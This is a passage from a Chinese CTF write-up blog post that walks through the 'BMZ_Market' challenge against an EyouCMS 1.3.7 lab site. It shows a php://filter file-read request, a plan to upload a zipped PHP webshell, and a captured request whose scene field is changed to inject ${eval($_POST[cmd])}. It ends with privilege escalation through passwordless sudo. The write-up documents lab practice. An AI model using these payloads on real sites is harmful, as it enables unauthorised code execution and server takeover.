+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?lang=php://filter/convert.base64-encode/resource=bmzadmin</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.bmzclub.cn:21490</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=ca99f077-3758-40ca-802a-0b8afbf5b9e7; Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1612590588,1612590698; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1612590698; PHPSESSID=r8hvjhmrvbjjcp8sbov7pmm2p0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到<code>bmzadmin.php</code>内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// [ 应用入口文件 ]</span></span><br><span class="line"><span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;zlib&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ob_start(<span class="string">&#x27;ob_gzhandler&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检测PHP环境</span></span><br><span class="line"><span class="keyword">if</span>(version_compare(PHP_VERSION,<span class="string">&#x27;5.4.0&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>))  <span class="keyword">die</span>(<span class="string">&#x27;本系统要求PHP版本 &gt;= 5.4.0，当前PHP版本为：&#x27;</span>.PHP_VERSION . <span class="string">&#x27;，请到虚拟主机控制面板里切换PHP版本，或联系空间商协助切换。&lt;a href=&quot;http://www.eyoucms.com/help/&quot; target=&quot;_blank&quot;&gt;点击查看易优安装教程&lt;/a&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息</span></span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);<span class="comment">//报告运行时错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测是否已安装EyouCMS系统</span></span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">&quot;./install/&quot;</span>) &amp;&amp; !file_exists(<span class="string">&quot;./install/install.lock&quot;</span>))&#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:./install/index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定当前访问到admin模块</span></span><br><span class="line">define(<span class="string">&#x27;BIND_MODULE&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="comment">// 缓存时间</span></span><br><span class="line">define(<span class="string">&#x27;EYOUCMS_CACHE_TIME&#x27;</span>, <span class="number">86400</span>);</span><br><span class="line"><span class="comment">// 数据绝对路径</span></span><br><span class="line">define(<span class="string">&#x27;DATA_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/data/&#x27;</span>);</span><br><span class="line"><span class="comment">// 运行缓存</span></span><br><span class="line">define(<span class="string">&#x27;RUNTIME_PATH&#x27;</span>, DATA_PATH . <span class="string">&#x27;runtime/&#x27;</span>);</span><br><span class="line"><span class="comment">// 安装程序定义</span></span><br><span class="line">define(<span class="string">&#x27;DEFAULT_INSTALL_DATE&#x27;</span>,<span class="number">1525756440</span>);</span><br><span class="line"><span class="comment">// 序列号</span></span><br><span class="line">define(<span class="string">&#x27;DEFAULT_SERIALNUMBER&#x27;</span>,<span class="string">&#x27;20180508131400oCWIoa&#x27;</span>);</span><br><span class="line"><span class="comment">// 定义应用目录</span></span><br><span class="line">define(<span class="string">&#x27;APP_PATH&#x27;</span>, <span class="keyword">__DIR__</span> . <span class="string">&#x27;/application/&#x27;</span>);</span><br><span class="line"><span class="comment">// 加载框架引导文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/core/start.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现是eyoucms，访问bmzadmin.php，发现登录界面</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf4.png"></p>
+<p>对其一顿暴破发现啥也不是，接着看wp，发现<code>index.php</code>中之前看到的password，做到这里给忘了。。。</p>
+<p>用户名admin和bmzadmin都不对，在首页源码中存在</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Power by<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>@kuaile<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>试一下用户名kuaile，登录成功，发现eyoucms版本为1.3.7</p>
+<p>在零组文库找一下eyoucms漏洞，发现1.3.9以前版本插件处存在文件上传漏洞</p>
+<p>根据文库复现步骤进行复现</p>
+<blockquote>
+<p>在Weapp.php文件中的upload()方法中可以上传zip文件，并会自动解压到一个文件夹名是随机md5值的文件夹下</p>
+<p>在后台开启插件功能，上传zip文件，zip中有php一句话木马以及一个任意图片(图片内容无所谓，正常图片即可，但是必须得有)</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf5.png"></p>
+<p>上传后，虽然会返回错误信息，但是实际上后台已经解压了zip文件</p>
+<p>访问内容管理模块，任意选择一个产品进行编辑，再图片集处可以上传图片，选择在线管理，可以在左侧看到该文件夹名</p>
+<p>直接访问该文件夹下的php一句话木马文件即可</p>
+</blockquote>
+<p>到在线管理处，发现漏洞详情中所提的文件夹名不存在</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf6.png"></p>
+<p>再看wp，wp提到可能是本题环境做了限制，不过存在另一处漏洞可getshell</p>
+<p>点击插件应用-插件开发者，按要求填写相关信息后，使用burpsuite进行拦截，点击初始化结构，放行第一个请求，拦截第二个请求，发送到repeater</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bmzadmin.php?m=admin&amp;c=Weapp&amp;a=create&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.bmzclub.cn:21490</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>94</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.bmzclub.cn:21490</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://www.bmzclub.cn:21490/bmzadmin.php?m=admin&amp;c=Weapp&amp;a=create&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=ca99f077-3758-40ca-802a-0b8afbf5b9e7; PHPSESSID=r8hvjhmrvbjjcp8sbov7pmm2p0; Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1612590588,1612590698,1612599669; admin_lang=cn; home_lang=cn; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1612600412; ENV_GOBACK_URL=%2Fbmzadmin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_LIST_URL=%2Fbmzadmin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_archives%26lang%3Dcn; ENV_IS_UPHTML=0; workspaceParam=index%7CWeapp</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">code=Shell&amp;name=shell&amp;version=v1.0.0&amp;min_version=v1.3.7&amp;author=shell&amp;scene=0&amp;description=shell</span><br></pre></td></tr></table></figure>
+
+<p>修改<code>scene=0</code>为<code>scene=bbb\&#39;,$&#123;eval($_POST[cmd])&#125;,//</code>，send</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf7.png"></p>
+<p>验证shell</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf8.png"></p>
+<p>蚁剑连接，在根目录下没找到flag，查看<code>/root</code>目录发现flag，直接查看发现没权限</p>
+<p>打开终端，<code>sudo -l</code>发现当前用户www-data可以root身份执行所有操作，并且不需要输入密码</p>
+<p>直接查看flag</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/bmzctf9.png"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Write-Up/" rel="tag"># Write-Up</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/19/ictf%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%85%E7%94%9F%E8%AF%95%E9%AA%8C%E5%9C%BAwp/" rel="next" title="ictf网络安全内生试验场wp">
+      ictf网络安全内生试验场wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F"><span class="nav-number">1.</span> <span class="nav-text">综合渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BMZ-Market"><span class="nav-number">1.1.</span> <span class="nav-text">BMZ_Market</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="chaser"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">chaser</p>
+  <div class="site-description" itemprop="description">文档工程师 摸鱼砖家</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chaserw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chaserw" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chaser</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
